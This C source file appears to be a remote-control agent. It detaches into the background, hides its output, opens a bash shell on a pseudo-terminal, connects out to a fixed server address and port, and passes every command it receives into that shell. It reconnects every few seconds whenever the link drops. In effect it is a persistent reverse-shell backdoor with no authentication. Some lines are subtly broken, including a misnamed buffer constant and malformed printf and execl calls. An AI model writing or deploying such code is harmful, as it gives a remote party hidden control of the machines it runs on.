#include "unp.h"
#include <sys/select.h>
#include <sys/types.h>
#include <signal.h>
#include <termios.h>
#include <errno.h>

#define	BUF_SIZE	16384		/* max #bytes to request from server */
#define SERVER_ADDR mashcontrol.pingshunbobo.com
#define SERVER_PORT 19293

void sig_child(int signo);
void server(char *host, char *port);

int setnonblocking(int fd)
{
    int old_option = fcntl(fd, F_GETFL );
    int new_option = old_option | O_NONBLOCK;
    Fcntl(fd, F_SETFL, new_option );
    return old_option;
}

static void set_noecho(int fd)		/* turn off echo (for slave pty) */
{
	struct termios	stermios;

	if (tcgetattr(fd, &stermios) < 0)
		printf("tcgetattr error");

	stermios.c_lflag &= ~(ECHO | ECHOE | ECHOK | ECHONL);
	stermios.c_oflag &= ~(ONLCR);
			/* also turn off NL to CR/NL mapping on output */

	if (tcsetattr(fd, TCSANOW, &stermios) < 0)
		printf("tcsetattr error");
}


int main(int argc, char **argv)
{
	int	client_fd, fdm;
	int	nbytes;
	int	logined;
	char 	slave_name[20];
	pid_t	pid = 0;
	fd_set	rset;

	char	request[BUF_SIZE];
	char	reply[BUF_SIZE];

	/* daemon_init */ 

	if((pid = Fork())!= 0)
		exit(0);
	setsid();
	signal(SIGCHLD, sig_child);
	signal(SIGINT, SIG_IGN);

	chdir("~");
	umask(0);
	close(0);
	close(1);
	close(2);
	/* end daemon_init */

start:
	pid = pty_fork(&fdm, slave_name, 20, NULL, NULL);
	if (pid < 0)
		printf("fork error");

	else if (pid == 0) {		/* child with pty slave! */
		set_noecho(STDIN_FILENO);
		if( execl("/usr/bin/bash", NULL)  == -1)
			printf("%s execve error!", strerror(errno));
	}
	int cflags = fcntl(fdm, F_GETFL,0);
	fcntl(fdm,F_SETFL, cflags|O_NONBLOCK);

connect:
	//client_fd = Tcp_connect("mashcontrol.pingshunbobo.com", "19293");
	client_fd = Tcp_connect("192.168.78.135", "19293");
	setnonblocking(client_fd);

	/* add Client hello info */
	struct sockaddr_in addr;
	socklen_t addrlen = sizeof(addr);
	if(getpeername(client_fd, (struct sockaddr*)&addr, &addrlen) == -1){
		fprintf(stderr,"Get client information failed,=%d.\n", client_fd);
		return 0;
	}
	char buf[16];
	if((inet_ntop(addr.sin_family, &addr.sin_addr, buf, addrlen)) == NULL){
		fprintf(stderr,"Get client information failed, fd=%d .\n", client_fd);        
		return 0;
	}
	//printf("buf: %s\n", buf);
	memset(reply, '\0', BUF_SIZE);
	snprintf(reply, 11, "Mashinfo: " );
	memcpy(reply + 10, buf, 16);
	//printf("%s", reply);
	nbytes = write(client_fd, reply, 26);
	
	FD_ZERO(&rset);
	/*  parent process  */
	while(1){
		FD_SET(client_fd, &rset);
		FD_SET(fdm, &rset);
		select (client_fd + 1, &rset, NULL, NULL, NULL);
		if(FD_ISSET(client_fd, &rset)){
			memset(request, '\0', BUF_SIZE);
			nbytes = read(client_fd, request, BUF_SIZE);
			if ( nbytes < 0){
				/* read data error! */
				continue;
			}
			if ( nbytes == 0){
				printf("server closed client_fd %s", nbytes, strerror(errno));
				goto reconnect;
			}
			/* write content which from server to the pty bash */
			if (writen(fdm, request, nbytes) != nbytes)
				printf("writen error to master pty");
		}
		if(FD_ISSET(fdm, &rset)){
			memset(reply, '\0', BUF_SIZE);
			if ( (nbytes = read(fdm, reply, BUFFSIZE)) <= 0)
				goto restart;
			nbytes = write(client_fd, reply, nbytes);
			if( nbytes < 0 ){
				if (errno == EAGAIN)
					continue;
				else
					goto restart;
			}
		}
	} /* end loop */

reconnect:
	Close(client_fd);
	sleep(5);
	goto connect;

restart:
	Close(client_fd);
	sleep(5);
	goto start;
}

void sig_child(int signo)
{
	pid_t pid;
	int stat;
	pid = wait(&stat);
}
